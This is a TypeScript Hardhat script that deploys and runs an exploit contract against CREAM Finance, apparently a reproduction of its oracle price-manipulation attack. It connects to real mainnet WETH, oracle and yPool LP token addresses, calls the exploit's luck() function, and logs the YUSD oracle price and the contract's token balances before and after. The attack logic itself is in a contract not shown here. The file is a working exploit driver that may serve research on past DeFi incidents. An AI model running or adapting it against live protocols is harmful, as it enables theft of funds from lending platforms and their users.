import {Luck__factory,
     IERC20__factory, 
     IComptroller__factory,
     ICrErc20__factory,
     IPriceOracle__factory} from "../typechain";
import hre, { ethers } from "hardhat"
import YAML from 'yaml'
import fs from 'fs'


async function main() {
    // Read parameters from config.yml
    const config_file = fs.readFileSync('config.yml', 'utf8');
    const config = YAML.parse(config_file);
    // Execute exploit
    const provider = hre.ethers.getDefaultProvider();
    const [signer] = await hre.ethers.getSigners();
    const exploit = await new Luck__factory(signer).deploy();
    
    const WETH = IERC20__factory.connect("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",signer);
    const Oracle = IPriceOracle__factory.connect("0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d", signer);
    const yPoolLP = IERC20__factory.connect("0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8",signer);

    console.log("Exploit contract deployed to: ",exploit.address);
    // console.log("Attacker ETH balance:", await provider.getBalance(signer.address));
    console.log("Exploit contract's ETH balance:", await ethers.provider.getBalance(exploit.address));
    console.log("The YUSD's price before exploiting in CREAM Finance Oracle: ", await Oracle.getUnderlyingPrice("0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4"));
    console.log("Exploit begin.")
    const exploitTx = await exploit.luck();
    await exploitTx.wait()
    const exploitPartner = await exploit.criminal_accomplice();
    console.log("Exploit complete.")
    console.log("The YUSD's price after exploiting in CREAM Finance Oracle: ", await Oracle.getUnderlyingPrice("0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4"));
    // console.log("Attacker ETH balance after exploiting: ", await provider.getBalance(signer.address));
    console.log("Exploit contract's ETH balance after exploiting:", await ethers.provider.getBalance(exploit.address));
    console.log("Exploit contract's yPool LP token balance after exploiting:", await yPoolLP.balanceOf(exploit.address));
    // Get result
  }
  
  main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });